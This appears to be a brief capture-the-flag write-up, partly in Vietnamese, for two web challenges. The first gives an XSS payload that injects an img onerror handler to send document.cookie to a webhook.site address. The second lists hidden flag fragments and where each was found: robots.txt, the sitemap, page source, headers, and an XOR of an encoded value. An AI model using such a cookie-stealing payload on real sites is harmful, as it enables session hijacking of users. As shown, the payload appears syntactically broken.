## Web 1: XSS
*payload* = </script><img src onerror="https://webhook.site/e0ab9c4f-1caf-47fb-bfc4-1f08b1f706b6?cookie="+document.cookie>

## web 2: Tìm các mảnh flag được giấu trong trang

-**seen1**: S4bZz3hhH, ở endpoint /ohhh-ive-seen-a-seen khi xem robots.txt
-**seen2**: S1IIr, xem tại /sitemap.xml
-**seen3**: S1iBb, xem source, tại hàm attr của <input>
-**seen4**: S4Am4n0Oo, xem source, nằm ở phần comment dưới cùng 
-**seen5**: Se3nJ3dDd, /xor-key, while trying to get the seen7
-**seen6**: SOonb0Ll, b64 encoded trong resquest header
-**seen7**: Se3kKke3, tại endpoint /xor-key sửa Sec-Fetch-Dest từ document thành 7seen và thêm ?name=Hajji+firuz vào url, được một đoạn encode. Đem đoạn encode đó xor với seen 5 sẽ ra seen 7
